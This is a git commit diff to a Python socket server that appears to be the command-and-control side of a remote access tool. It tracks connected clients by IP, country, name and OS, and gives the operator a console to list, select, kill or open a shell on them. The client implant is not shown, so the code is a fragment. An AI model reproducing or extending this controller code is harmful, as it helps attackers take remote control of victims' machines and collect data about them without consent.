106a4595aaa7e5b62455620f3c2abf061a908e9a
Asaf-Zanjiri <60044819+Asaf-Zanjiri@users.noreply.github.com>
2021-05-24 22:34:34 +0300

    Add files via upload

--- server_folder/config.py
+++ server_folder/config.py
@@ -1,9 +1,3 @@
-global BUFFER_SIZE
-global all_connections
-global all_addresses
-global custom_console
-
 BUFFER_SIZE = 1024
 all_connections = []
-all_addresses = []
 custom_console = 'oSys> '
--- server_folder/server.py
+++ server_folder/server.py
@@ -2,6 +2,7 @@ import socket
 import threading
 from server_folder.tools import Menu
 import server_folder.config as config
+import json
 
 
 class Server:
@@ -50,40 +51,56 @@ def print_logo():
 
 
 def client_connections():
-    while True:
-        (client_socket, addr) = server.server_socket.accept()
-        print('\n[+] New connection from: ', addr[0])
-        config.all_connections.append(client_socket)
-        config.all_addresses.append(addr)
+    try:
+        while True:
+            (client_socket, addr) = server.server_socket.accept()
+            print('\n[+] New connection from: ', addr[0])
+            client_data = server.receive(client_socket).split(',')  # IP,CountryCode,Name,Os
+            print({'ip': client_data[0], 'data': {'countryCode': client_data[1], 'name': client_data[2], 'os': client_data[3], 'socket': client_socket}})
+
+            # Add new client to the clients list
+            exist = False
+            for client in config.all_connections:
+                if client['ip'] == addr[0]:
+                    exist = True
+                    break
+            if not exist:
+                config.all_connections.append({'ip': client_data[0], 'data': {'countryCode': client_data[1], 'name': client_data[2], 'os': client_data[3], 'socket': client_socket}})
+    except socket.error:
+        client_connections()
 
 
 def main():
     print_logo()
     global server
-    server = Server('0.0.0.0', 8000)
+    server = Server('localhost', 8000)
     menu = Menu(server)
     threading.Thread(target=client_connections).start()  # Thread to accept new connections
+    # threading.Thread(target=idle_check).start() # Thread to check if the user is idle/if the machine is still connected.
     while True:
         user_input = input(config.custom_console).split()
         cmd = user_input[0] if len(user_input) > 0 else ''  # Get raw command
         args = user_input[1] if len(user_input) > 1 else ''  # Get raw argument
 
-        if cmd == 'menu' or cmd.lower() == 'help':
-            menu.help()
-        elif cmd == 'list':
-            menu.client_list()
-        elif cmd == 'select':
-            menu.select(int(args))
-        elif cmd == 'quit':
-            menu.quit()
-        elif cmd == 'kill':
-            menu.kill()
-        elif cmd == 'shell':
-            menu.shell()
-        elif cmd == '':
-            print('\n')
-        else:
-            print('[!] Invalid command.\n')
+        try:
+            if cmd == 'menu' or cmd.lower() == 'help':
+                menu.help()
+            elif cmd == 'list':
+                menu.refresh_client_list()
+            elif cmd == 'select':
+                menu.select(int(args))
+            elif cmd == 'quit':
+                menu.quit()
+            elif cmd == 'kill':
+                menu.kill()
+            elif cmd == 'shell':
+                menu.shell()
+            elif cmd == '':
+                print('\n')
+            else:
+                print('[!] Invalid command.\n')
+        except Exception as e:
+            print(e)
 
 
 if __name__ == "__main__":
